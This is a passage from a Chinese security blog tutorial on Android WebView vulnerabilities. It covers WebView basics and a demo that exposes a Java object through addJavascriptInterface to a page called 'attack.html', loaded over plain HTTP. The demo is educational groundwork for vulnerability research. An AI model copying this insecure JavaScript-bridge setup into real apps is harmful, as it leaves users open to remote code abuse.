<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 6.3.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"security-kitchen.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"./public/search.json"};
  </script>

  <meta name="description" content="一、前言快半个月没有更新文章了，最近不少朋友催更了，今天我们进入Android APP漏洞之战系列文章中的一个重要篇幅——WebView漏洞，我们都知道在当下App漏洞中，WebView漏洞的占比是十分巨大的，各种类型的漏洞问题层出不穷，这篇文章就带着大家一起揭开WebView漏洞神奇的面纱。">
<meta property="og:type" content="article">
<meta property="og:title" content="Android App漏洞之战（20）——Webview漏洞详解">
<meta property="og:url" content="http://security-kitchen.com/2023/02/14/bug0020/index.html">
<meta property="og:site_name" content="欢迎来到安全后厨！">
<meta property="og:description" content="一、前言快半个月没有更新文章了，最近不少朋友催更了，今天我们进入Android APP漏洞之战系列文章中的一个重要篇幅——WebView漏洞，我们都知道在当下App漏洞中，WebView漏洞的占比是十分巨大的，各种类型的漏洞问题层出不穷，这篇文章就带着大家一起揭开WebView漏洞神奇的面纱。">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/1.png">
<meta property="og:image" content="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/2.png">
<meta property="og:image" content="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/3.png">
<meta property="og:image" content="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/4.png">
<meta property="og:image" content="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/26.png">
<meta property="og:image" content="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/27.png">
<meta property="og:image" content="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/28.png">
<meta property="og:image" content="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/29.png">
<meta property="og:image" content="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/5.png">
<meta property="og:image" content="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/8.png">
<meta property="og:image" content="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/9.png">
<meta property="og:image" content="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/10.png">
<meta property="og:image" content="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/11.png">
<meta property="og:image" content="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/12.png">
<meta property="og:image" content="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/13.png">
<meta property="og:image" content="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/14.png">
<meta property="og:image" content="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/15.png">
<meta property="og:image" content="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/16.png">
<meta property="og:image" content="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/17.png">
<meta property="og:image" content="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/18.png">
<meta property="og:image" content="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/19.png">
<meta property="og:image" content="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/20.png">
<meta property="og:image" content="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/21.png">
<meta property="og:image" content="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/22.png">
<meta property="og:image" content="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/23.png">
<meta property="og:image" content="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/24.png">
<meta property="og:image" content="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/25.png">
<meta property="og:image" content="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/30.png">
<meta property="og:image" content="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/31.png">
<meta property="og:image" content="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/37.png">
<meta property="og:image" content="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/38.png">
<meta property="og:image" content="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/39.png">
<meta property="og:image" content="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/40.png">
<meta property="og:image" content="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/41.png">
<meta property="og:image" content="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/42.png">
<meta property="og:image" content="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/43.png">
<meta property="og:image" content="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/36.png">
<meta property="og:image" content="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/44.png">
<meta property="og:image" content="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/74.png">
<meta property="og:image" content="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/75.png">
<meta property="og:image" content="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/45.png">
<meta property="og:image" content="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/46.png">
<meta property="og:image" content="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/47.png">
<meta property="og:image" content="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/48.png">
<meta property="og:image" content="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/69.png">
<meta property="og:image" content="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/70.png">
<meta property="og:image" content="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/71.png">
<meta property="og:image" content="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/72.png">
<meta property="og:image" content="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/73.png">
<meta property="og:image" content="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/49.png">
<meta property="og:image" content="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/50.png">
<meta property="og:image" content="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/51.png">
<meta property="og:image" content="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/52.png">
<meta property="og:image" content="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/32.png">
<meta property="og:image" content="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/33.png">
<meta property="og:image" content="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/34.png">
<meta property="og:image" content="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/35.png">
<meta property="og:image" content="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/36.png">
<meta property="og:image" content="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/53.png">
<meta property="og:image" content="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/54.png">
<meta property="og:image" content="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/55.png">
<meta property="og:image" content="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/56.png">
<meta property="og:image" content="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/57.png">
<meta property="og:image" content="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/58.png">
<meta property="og:image" content="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/59.png">
<meta property="og:image" content="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/60.png">
<meta property="og:image" content="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/61.png">
<meta property="og:image" content="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/62.png">
<meta property="og:image" content="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/63.png">
<meta property="og:image" content="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/64.png">
<meta property="og:image" content="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/65.png">
<meta property="og:image" content="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/66.png">
<meta property="og:image" content="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/67.png">
<meta property="og:image" content="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/68.png">
<meta property="og:image" content="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/76.png">
<meta property="article:published_time" content="2023-02-14T01:09:19.000Z">
<meta property="article:modified_time" content="2023-12-23T09:13:44.114Z">
<meta property="article:author" content="安全后厨团队">
<meta property="article:tag" content="漏洞挖掘">
<meta property="article:tag" content="工具">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/1.png">

<link rel="canonical" href="http://security-kitchen.com/2023/02/14/bug0020/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : false,
    isPost : true,
    lang   : 'zh-CN'
  };
</script>

  <title>Android App漏洞之战（20）——Webview漏洞详解 | 欢迎来到安全后厨！</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

<link rel="alternate" href="/atom.xml" title="欢迎来到安全后厨！" type="application/atom+xml">
</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>
	<div class="headband"></div>
    <a target="_blank" rel="noopener" href="https://github.com/WindXaa?tab=repositories" class="github-corner" aria-label="View source on GitHub"><svg width="80" height="80" viewBox="0 0 250 250" style="fill:#151513; color:#fff; position: absolute; top: 0; border: 0; right: 0;" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a><style>.github-corner:hover .octo-arm{animation:octocat-wave 560ms ease-in-out}@keyframes octocat-wave{0%,100%{transform:rotate(0)}20%,60%{transform:rotate(-25deg)}40%,80%{transform:rotate(10deg)}}@media (max-width:500px){.github-corner:hover .octo-arm{animation:none}.github-corner .octo-arm{animation:octocat-wave 560ms ease-in-out}}</style>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">欢迎来到安全后厨！</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
        <i class="fa fa-search fa-fw fa-lg"></i>
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>

  </li>
        <li class="menu-item menu-item-tags">

    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>

  </li>
        <li class="menu-item menu-item-categories">

    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>

  </li>
        <li class="menu-item menu-item-about">

    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>

  </li>
        <li class="menu-item menu-item-resources">

    <a href="/resources/" rel="section"><i class="fa fa-download fa-fw"></i>资源</a>

  </li>
      <li class="menu-item menu-item-search">
        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
        </a>
      </li>
  </ul>
</nav>



  <div class="search-pop-overlay">
    <div class="popup search-popup">
        <div class="search-header">
  <span class="search-icon">
    <i class="fa fa-search"></i>
  </span>
  <div class="search-input-container">
    <input autocomplete="off" autocapitalize="off"
           placeholder="搜索..." spellcheck="false"
           type="search" class="search-input">
  </div>
  <span class="popup-btn-close">
    <i class="fa fa-times-circle"></i>
  </span>
</div>
<div id="search-result">
  <div id="no-result">
    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
  </div>
</div>

    </div>
  </div>

</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content post posts-expand">
            

    
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://security-kitchen.com/2023/02/14/bug0020/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.png">
      <meta itemprop="name" content="安全后厨团队">
      <meta itemprop="description" content="选择有时候比努力更重要">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="欢迎来到安全后厨！">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          Android App漏洞之战（20）——Webview漏洞详解
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2023-02-14 09:09:19" itemprop="dateCreated datePublished" datetime="2023-02-14T09:09:19+08:00">2023-02-14</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2023-12-23 17:13:44" itemprop="dateModified" datetime="2023-12-23T17:13:44+08:00">2023-12-23</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Android-APP%E6%BC%8F%E6%B4%9E%E4%B9%8B%E6%88%98/" itemprop="url" rel="index"><span itemprop="name">Android APP漏洞之战</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
              <span class="post-meta-item-icon">
                <i class="fa fa-eye"></i>
              </span>
              <span class="post-meta-item-text">阅读次数：</span>
              <span id="busuanzi_value_page_pv"></span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
        <h2 id="一、前言"><a href="#一、前言" class="headerlink" title="一、前言"></a>一、前言</h2><p>快半个月没有更新文章了，最近不少朋友催更了，今天我们进入Android APP漏洞之战系列文章中的一个重要篇幅——WebView漏洞，我们都知道在当下App漏洞中，WebView漏洞的占比是十分巨大的，各种类型的漏洞问题层出不穷，这篇文章就带着大家一起揭开WebView漏洞神奇的面纱。</p>
<span id="more"></span>
<p>本文第二节讲述WebView的基本知识</p>
<p>本文第三节讲述WebView的漏洞面</p>
<p>本文第四节进行了漏洞原理介绍和漏洞复现</p>
<p>总结：本文从WebView开发出发，从0开始进行漏洞的讲解和复现，花了几天时间，列举了WebView中的20多种漏洞案例，并手动复现了其中十余种案例，希望用这篇万字长文介绍WebView漏洞的基本发展。</p>
<h2 id="二、基础知识"><a href="#二、基础知识" class="headerlink" title="二、基础知识"></a>二、基础知识</h2><h3 id="1-WebView基础"><a href="#1-WebView基础" class="headerlink" title="1.WebView基础"></a>1.WebView基础</h3><h4 id="（1）WebView概述"><a href="#（1）WebView概述" class="headerlink" title="（1）WebView概述"></a>（1）WebView概述</h4><p>Android WebView在Android平台上是一个特殊的View，它能用来显示网页，这个WebView类可以被用来在app中仅仅显示一张在线的网页，还可以用来开发浏览器。</p>
<p>WebView内部实现是采用渲染引擎(WebKit)来展示view的内容，提供网页前进后退、网页放大、缩小、搜索等功能。Android WebView 在低版本和高版本采用了不同的 webkit 版本内核，在 4.4 版本后使用 Chrome 内核。</p>
<h4 id="（2）WebView作用"><a href="#（2）WebView作用" class="headerlink" title="（2）WebView作用"></a>（2）WebView作用</h4><ul>
<li>显示和渲染Web页面</li>
<li>直接使用html文件（网络上或本地assets中）作布局</li>
<li>可和JavaScript交互调用</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">WebView控件功能强大，除了具有一般View的属性和设置外，还可以对url请求、页面加载、渲染、页面交互进行强大的处理。</span><br></pre></td></tr></table></figure>

<h4 id="（3）WebView基础使用"><a href="#（3）WebView基础使用" class="headerlink" title="（3）WebView基础使用"></a>（3）WebView基础使用</h4><h5 id="lt-1-gt-本地加载"><a href="#lt-1-gt-本地加载" class="headerlink" title="&lt;1&gt;本地加载"></a>&lt;1&gt;本地加载</h5><p>Web最简单显示网页内容，基本步骤：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1.在布局文件中添加WebView控件；</span><br><span class="line">2.在代码中让WebView控件加载显示网页。</span><br></pre></td></tr></table></figure>

<p>具体操作：</p>
<p>首先，我们在布局文件中来添加WebView控件，如下</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">WebView</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:id</span>=<span class="string">&quot;@+id/Wind_webview&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_width</span>=<span class="string">&quot;match_parent&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_height</span>=<span class="string">&quot;match_parent&quot;</span> /&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/1.png" alt="image-20220726171401583"></p>
<p>然后我们在代码中让WebView控件加载显示网页，如下：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//获得控件</span></span><br><span class="line">       <span class="type">WebView</span> <span class="variable">webView</span> <span class="operator">=</span> (WebView) findViewById(R.id.Wind_webview);</span><br><span class="line">       <span class="comment">//访问网页</span></span><br><span class="line">       webView.loadUrl(<span class="string">&quot;http://www.baidu.com&quot;</span>);</span><br><span class="line">       <span class="comment">//系统默认会通过手机浏览器打开网页，为了能够直接通过WebView显示网页，则必须设置</span></span><br><span class="line">       webView.setWebViewClient(<span class="keyword">new</span> <span class="title class_">WebViewClient</span>()&#123;</span><br><span class="line">           <span class="meta">@Override</span></span><br><span class="line">           <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">shouldOverrideUrlLoading</span><span class="params">(WebView view, String url)</span> &#123;</span><br><span class="line">               <span class="comment">//使用WebView加载显示url</span></span><br><span class="line">               view.loadUrl(url);</span><br><span class="line">               <span class="comment">//返回true</span></span><br><span class="line">               <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;);</span><br></pre></td></tr></table></figure>

<p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/2.png" alt="image-20220726171554052"></p>
<p>最后我们在配置文件中添加网络权限：</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 添加网络权限 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">&quot;android.permission.INTERNET&quot;</span> /&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/3.png" alt="image-20220726171648967"></p>
<p>运行程序，显示如下：</p>
<p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/4.png" alt="image-20220726171737615"></p>
<h5 id="lt-2-gt-远程加载"><a href="#lt-2-gt-远程加载" class="headerlink" title="&lt;2&gt;远程加载"></a>&lt;2&gt;远程加载</h5><p>首先，我们直接在本地新建js文件</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;!<span class="variable constant_">DOCTYPE</span> html&gt;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Carson<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">         <span class="keyword">function</span> <span class="title function_">callAndroid</span>(<span class="params"></span>)&#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">            <span class="comment">//由于对象映射，所以调用test对象等于调用Android映射的对象</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">            test.<span class="title function_">hello</span>(<span class="string">&quot;WindXaa!&quot;</span>);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">         &#125;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">      </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">   <span class="comment">&lt;!--点击按钮则调用callAndroid函数--&gt;</span></span></span><br><span class="line"><span class="language-xml">   <span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">&quot;button&quot;</span> <span class="attr">id</span>=<span class="string">&quot;button1&quot;</span> <span class="attr">onclick</span>=<span class="string">&quot;callAndroid()&quot;</span>&gt;</span>Internet Click connect<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span></span><br></pre></td></tr></table></figure>

<p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/26.png" alt="image-20220729155049524"></p>
<p>然后我们开启一个简易的http_server的监听</p>
<p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/27.png" alt="image-20220729155135353"></p>
<p>我们编写代码：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line"><span class="type">WebView</span> <span class="variable">mWebView</span> <span class="operator">=</span> (WebView) findViewById(R.id.Wind_webview1);</span><br><span class="line"><span class="type">WebSettings</span> <span class="variable">webSettings</span> <span class="operator">=</span> mWebView.getSettings();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 设置与Js交互的权限</span></span><br><span class="line">webSettings.setJavaScriptEnabled(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 通过addJavascriptInterface()将Java对象映射到JS对象</span></span><br><span class="line"><span class="comment">//参数1：Javascript对象名</span></span><br><span class="line"><span class="comment">//参数2：Java对象名</span></span><br><span class="line">mWebView.addJavascriptInterface(<span class="keyword">new</span> <span class="title class_">AndroidtoJs</span>(), <span class="string">&quot;test&quot;</span>);<span class="comment">//AndroidtoJS类对象映射到js的test对象</span></span><br><span class="line">mWebView.loadData(<span class="string">&quot;&quot;</span>,<span class="string">&quot;text/html&quot;</span>,<span class="literal">null</span>);</span><br><span class="line"><span class="comment">// 加载JS代码</span></span><br><span class="line"><span class="comment">// 格式规定为:file:///android_asset/文件名.html</span></span><br><span class="line"><span class="comment">// mWebView.loadUrl(&quot;file:///android_asset/javascript.html&quot;);</span></span><br><span class="line">mWebView.loadUrl(<span class="string">&quot;http://ip地址填自己的/attack.html&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 提供接口在Webview中供JS调用</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">AndroidtoJs</span> &#123;</span><br><span class="line">    <span class="comment">// 定义JS需要调用的方法，被JS调用的方法必须加入@JavascriptInterface注解</span></span><br><span class="line">    <span class="meta">@JavascriptInterface</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">hello</span><span class="params">(String msg)</span> &#123;</span><br><span class="line">        Log.e(<span class="string">&quot;WindXaa&quot;</span>,<span class="string">&quot;Hello，&quot;</span> + msg);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>然后我们再次运行程序</p>
<p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/28.png" alt="image-20220729155443281"></p>
<p>这里就说明我们远程加载文件成功了，我们点击按钮</p>
<p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/29.png" alt="image-20220729160726979"></p>
<p>可以发现可以成功的通过JS调用Android代码</p>
